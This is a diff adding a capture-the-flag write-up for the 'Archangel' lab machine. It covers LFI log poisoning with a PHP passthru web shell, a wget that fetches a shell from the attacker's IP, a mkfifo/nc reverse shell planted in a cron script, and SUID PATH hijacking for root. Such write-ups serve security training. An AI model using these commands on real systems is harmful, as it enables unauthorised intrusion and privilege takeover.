+gnats:x:41:41:Gnats<span class="w"> </span>Bug-Reporting<span class="w"> </span>System<span class="w"> </span><span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd<span class="w"> </span>Network<span class="w"> </span>Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd<span class="w"> </span>Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+<span class="hll">archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
+</span></code></pre></div></td></tr></table></div>
 <h2 id="initial-access"><b>Initial Access</b><a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
+<p>I saw an opportunity to explore further and decided to try a different file. In the context of Local File Inclusion (LFI), the remote files cannot be accessed, but it is possible to modify the contents of local files. This provided an opening to execute a straightforward PHP script on log files.</p>
+<div class="highlight"><pre><span></span><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log
+</code></pre></div>
+<p>The server is configured to use Apache, which usually stores its log files in the directory <code>/var/log/apache2/access.log.</code> By utilizing the PHP command: </p>
+<div class="admonition tip">
+<p class="admonition-title">PHP Command Execution</p>
+<p><p id="desc" style="font-size:15px">&lt;? passthru($_GET[cmd]) ?&gt;</p></p>
+</div>
+<p>we could pass commands as an argument through <code>cmd</code> and successfully execute them.</p>
+<p><img id="image4" /></p>
+<p>I though of a plan to download a reverse shell onto the server by utilizing the "cmd" argument. The command was structured as follows: </p>
+<div class="highlight"><pre><span></span><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&amp;cmd=wget%20%20http://10.17.3.217:8000/shell.php
+</code></pre></div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>I had a local Python HTTP server beforehand.</p>
+</div>
+<p><img id="image5" /></p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 1: Hostname</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 2: Exploiting LFI</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 3: Initial Access</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 4: User Flag</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 5: Root Flag</li>
+</ul>
+<p>Subsequently, I accessed </p>
+<p><div class="highlight"><pre><span></span><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/shell.php
+</code></pre></div>
+which enabled me to gain initial access. Using this access, I successfully located the flag-3 at "/home/archangel/user.txt"</p>
+<p><img id="image6" /></p>
 <h2 id="privilege-escalation"><b>Privilege Escalation</b><a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
-<h3 id="gaining-user-access"><b>Gaining User access</b><a class="headerlink" href="#gaining-user-access" title="Permanent link">&para;</a></h3>
-<h3 id="gaining-root-access"><b>Gaining Root access</b><a class="headerlink" href="#gaining-root-access" title="Permanent link">&para;</a></h3>
+<h3 id="gaining-user-access-horizontal"><b>Gaining User access (Horizontal)</b><a class="headerlink" href="#gaining-user-access-horizontal" title="Permanent link">&para;</a></h3>
+<p>Afterwards, I was able to escalate my privileges horizontally for the user <code>archangel</code>. By running the <code>linpeas.sh</code> script, I discovered that there was a cron job running with the following configuration:</p>
+<div class="highlight"><pre><span></span><code>*/1<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>archangel<span class="w"> </span>/opt/helloworld.sh
+</code></pre></div>
+<p>This presented an opportunity to execute a reverse shell. To do so, I modified the code within the <code>helloworld.sh</code> file to include the following command:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.17.3.217 5433&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/opt/helloworld.sh
+</code></pre></div>
+<p>As a result of this change, I was able to successfully execute a reverse shell and obtain the flag-4 located at 
+~/secret/user2.txt</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 1: Hostname</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 2: Exploiting LFI</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 3: Initial Access</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 4: User Flag</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 5: Root Flag</li>
+</ul>
+<h3 id="gaining-root-access-vertical"><b>Gaining Root access (Vertical)</b><a class="headerlink" href="#gaining-root-access-vertical" title="Permanent link">&para;</a></h3>
+<p>Upon gaining access to the <code>archangel</code> account, I was keen to identify any binaries with SUID permissions since I lacked passwords for any of the users. Consequently, I ran the following command:</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>-04000<span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="m">392217</span><span class="w">     </span><span class="m">40</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">        </span><span class="m">40344</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/usr/bin/newgrp
+<span class="m">396413</span><span class="w">     </span><span class="m">76</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">        </span><span class="m">75824</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/usr/bin/gpasswd
+<span class="m">393011</span><span class="w">     </span><span class="m">76</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">        </span><span class="m">76496</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/usr/bin/chfn
+<span class="m">395021</span><span class="w">     </span><span class="m">44</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">        </span><span class="m">44528</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/usr/bin/chsh
+<span class="m">396417</span><span class="w">     </span><span class="m">60</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">        </span><span class="m">59640</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/usr/bin/passwd
+<span class="m">406571</span><span class="w">     </span><span class="m">20</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">        </span><span class="m">18448</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">28</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/usr/bin/traceroute6.iputils
+<span class="m">396823</span><span class="w">    </span><span class="m">148</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">       </span><span class="m">149080</span><span class="w"> </span>Sep<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/bin/sudo
+<span class="m">392437</span><span class="w">     </span><span class="m">44</span><span class="w"> </span>-rwsr-xr--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>messagebus<span class="w">    </span><span class="m">42992</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">11</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+<span class="m">524345</span><span class="w">    </span><span class="m">428</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">         </span><span class="m">436552</span><span class="w"> </span>Mar<span class="w">  </span><span class="m">4</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/usr/lib/openssh/ssh-keysign
+<span class="m">396700</span><span class="w">     </span><span class="m">12</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">10232</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">28</span><span class="w">  </span><span class="m">2017</span><span class="w"> </span>/usr/lib/eject/dmcrypt-get-device
+<span class="m">652899</span><span class="w">     </span><span class="m">28</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">26696</span><span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/bin/umount
+<span class="m">652831</span><span class="w">     </span><span class="m">44</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">44664</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/bin/su
+<span class="m">652862</span><span class="w">     </span><span class="m">44</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">43088</span><span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/bin/mount
+<span class="m">660690</span><span class="w">     </span><span class="m">32</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">30800</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">11</span><span class="w">  </span><span class="m">2016</span><span class="w"> </span>/bin/fusermount
+<span class="m">652934</span><span class="w">     </span><span class="m">64</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">64424</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">28</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/bin/ping
+<span class="hll"><span class="m">1053235</span><span class="w">     </span><span class="m">20</span><span class="w"> </span>-rwsr-xr-x<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">16904</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">18</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/home/archangel/secret/
+</span></code></pre></div></td></tr></table></div>
+<p>During the search, I noticed that the <code>/home/archangel/secret/</code> directory appeared suspicious. Further investigation revealed the presence of an <code>ELF binary</code> with the SUID bit set. I used the <code>strings</code> command to examine its content, which indicated that the binary was copying files using the following command:</p>
+<div class="highlight"><pre><span></span><code>cp<span class="w"> </span>/home/user/archangel/myfiles/*<span class="w"> </span>/opt/backupfiles
+</code></pre></div>
+<p>However, since the path did not exist, it was unlikely that the program would run successfully. To exploit this vulnerability, I created a <code>cp</code> binary file in the<code>/tmp</code> directory and added the path to it as follows:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;/tmp:</span><span class="nv">$PATH</span><span class="s2">&quot;</span>
+</code></pre></div>
+<p>With this modification, I was able to execute the "cp" command with the SUID permissions and obtain a root shell.</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 1: Hostname</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 2: Exploiting LFI</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 3: Initial Access</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 4: User Flag</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 5: Root Flag</li>
+</ul>
+<div class="admonition success">
+<p class="admonition-title">Success</p>
+<p>and from there, I had peace upon me! </p>
+</div>
 <script>
 
 // JSON object
 const data = {
-    "desc": "",
-    "ip":  "",
-    "ports": "",
+    "desc": "Archangel -- Boot2root, Web exploitation, Privilege escalation, LFI",
+    "ip":  "10.10.237.155 | 10.10.45.108 (used 2 Sessions)",
+    "ports": "22/tcp,ssh,OpenSSH 7.6p1 Ubuntu;80/tcp,http,Apache httpd 2.4.29",
     "difficulty":"easy",
-    "id": "1"
+    "id": "2"
 }
 
 
